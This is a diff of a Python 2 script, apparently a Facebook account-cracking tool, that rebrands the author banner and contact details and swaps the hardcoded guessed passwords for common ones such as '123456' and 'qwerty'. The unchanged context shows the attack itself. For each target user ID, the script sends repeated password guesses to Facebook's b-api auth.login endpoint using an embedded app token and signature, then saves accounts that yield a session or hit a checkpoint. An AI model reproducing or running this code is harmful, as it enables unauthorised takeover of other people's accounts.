@@ -55,9 +55,9 @@ logo = """\033[1;93m█████████
 \033[1;93m█████████      \033[1;92m«----------✧----------»
 \033[1;93m ██ ██
 \033[1;93m╔════════════════════════════════════════════╗
-\033[1;93m║\033[1;96m* \033[1;93mAuthor  \033[1;93m : \033[1;93mBrother•|Mr.BLACK0304\033[1;93m          ║
-\033[1;93m║\033[1;96m* \033[1;93mGitHub  \033[1;93m : \033[1;93m\033[4mhttps://Github.com/fatonicyber\033[0m \033[1;93m║
-\033[1;93m║\033[1;96m* \033[1;93mWhatsApp \033[1;93m: \033[1;93m0856-9101-5635\033[1;93m                 ║
+\033[1;93m║\033[1;96m* \033[1;93mAuthor  \033[1;93m : \033[1;93mBrother•|Mr.KOCLOK\033[1;93m          ║
+\033[1;93m║\033[1;96m* \033[1;93mGitHub  \033[1;93m : \033[1;93m\033[4mhttps://Github.com/pilek69\033[0m \033[1;93m║
+\033[1;93m║\033[1;96m* \033[1;93mWhatsApp \033[1;93m: \033[1;93m08580-0575-938\033[1;93m                 ║
 \033[1;93m╚════════════════════════════════════════════╝"""
 
 def tik():
@@ -82,8 +82,8 @@ print  """\033[1;96m [¤] \x1b[1;93mASSALAMUALAIKUM\x1b[1;96m  \033[1;96m   [¤]
 \033[1;96m [¤] \x1b[1;93mTOOLS MR.BLACK0304\x1b[1;96m  [¤] \x1b[1;93mYOUTUBE  : mr black0304\x1b[1;96m"""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "FATONICYBER"
-CorrectPassword = "MR.BLACK0304"
+CorrectUsername = "UPIL"
+CorrectPassword = "KOCLOK"
 
 loop = 'true'
 while (loop == 'true'):
@@ -322,7 +322,7 @@ def pilih_super():
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
-			pass1 = ('786786')
+			pass1 = ('123456')
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
@@ -364,7 +364,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = 'Bangsat'
+									pass4 = 'qwerty'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -378,7 +378,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = 'Sayang'
+											pass5 = 'english'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -392,7 +392,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'Kontol'
+													pass6 = 'london'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -408,7 +408,7 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = 'Anjing'
+															pass7 = 'flower'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
